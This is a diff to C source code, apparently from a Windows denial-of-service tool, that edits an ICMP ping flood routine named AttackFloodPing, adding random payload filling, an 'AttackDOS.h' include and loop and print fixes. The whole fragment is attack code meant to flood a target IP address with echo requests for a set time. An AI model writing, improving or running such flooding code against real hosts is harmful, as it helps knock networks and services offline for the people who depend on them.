@@ -3,8 +3,8 @@
 #include <icmpapi.h>
 #include <stdio.h>
 
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "ws2_32.lib")
+#include "MgArguments.h"
+#include "AttackDOS.h"
 
 #pragma warning(disable: 4996)
 
@@ -44,6 +44,9 @@ BOOL InitDosPing(char* ipAddress, DWORD dataSize, ICMP_DOS_STRUCT* icmpDosStruct
         free(icmpDosStruct->ReplyBuffer);
         return FALSE;
     }
+
+    CopyRandBuffer(icmpDosStruct->data, dataSize);
+
     return TRUE;
 }
 VOID CleanDosPing(char* ipAddress, DWORD dataSize, ICMP_DOS_STRUCT* icmpDosStruct) {
@@ -82,9 +85,9 @@ int AttackFloodPing(char* ipAddress, UINT dataSize, UINT waitTime) {
 
     InitDosPing(ipAddress, dataSize, &icmpDosStruct);
 
-    for (int i = 0; startTime + waitTime > currentTime; i++) {
+    for (UINT i = 0; (clock_t)(startTime + waitTime) > currentTime; i++) {
         PingDos(icmpDosStruct, dataSize);
-        printf("[i] Request number:%i\r", i);
+        printf("[i] Request number: %i\r", i);
         currentTime = clock();
     }
     PingDos(icmpDosStruct, dataSize);
